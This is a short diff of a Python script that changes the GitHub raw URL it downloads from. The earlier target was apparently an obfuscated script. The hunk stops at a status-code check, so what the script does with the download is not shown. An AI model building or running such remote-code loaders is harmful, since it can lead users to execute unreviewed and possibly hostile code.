@@ -1,6 +1,6 @@
 import requests
 
-url = 'https://raw.githubusercontent.com/hoangquocanh2008/MONKEYX/main/obf-5770402168.py'
+url = 'https://raw.githubusercontent.com/hoangquocanh2008/MONKEYX/main/toolgop'
 
 response = requests.get(url)
 if response.status_code == 200:
